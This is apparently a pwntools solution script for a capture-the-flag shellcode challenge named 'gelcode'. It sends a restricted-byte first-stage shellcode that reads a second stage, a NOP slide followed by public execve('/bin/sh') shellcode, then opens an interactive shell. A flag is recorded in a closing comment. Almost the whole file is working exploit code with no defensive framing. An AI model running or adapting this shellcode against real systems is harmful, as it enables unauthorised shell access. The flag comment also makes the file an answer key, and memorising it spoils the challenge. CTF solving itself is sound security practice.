from pwn import *

r = remote('gelcode.hsc.tf', 1337)

r.recvlines(2, timeout=1)

payload  = b''
payload += b'\x04\x0f' * 12             # add al, 0xf    /x12 = 0xb4

payload += b'\x00\x05\x00\x00\x00\x00'  # add byte ptr [rip], al
payload += b'\x0b\x00\x00\x00\x00'      # mov edi, 0      [bf=0b+b4]

payload += b'\x00\x05\x00\x00\x00\x00'  # add byte ptr [rip], al
payload += b'\x06\x00\x01\x00\x00'      # mov edx, 0x100  [ba=06+b4]

payload += b'\x00\x05\x00\x00\x00\x00'  # add byte ptr [rip], al
payload += b'\x04\x00\x00\x00\x00'      # mov eax, 0      [b8=04+b4]

payload += b'\x0f\x05'                  # syscall (read)

nop_slide_size = len(payload)
payload += b'\0' * (1000 - len(payload))

r.send(payload)

payload  = b'\x90' * nop_slide_size

# http://shell-storm.org/shellcode/files/shellcode-806.php
payload += b'\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05'

r.sendline(payload)

r.interactive()

# flag{bell_code_noughttwoeff}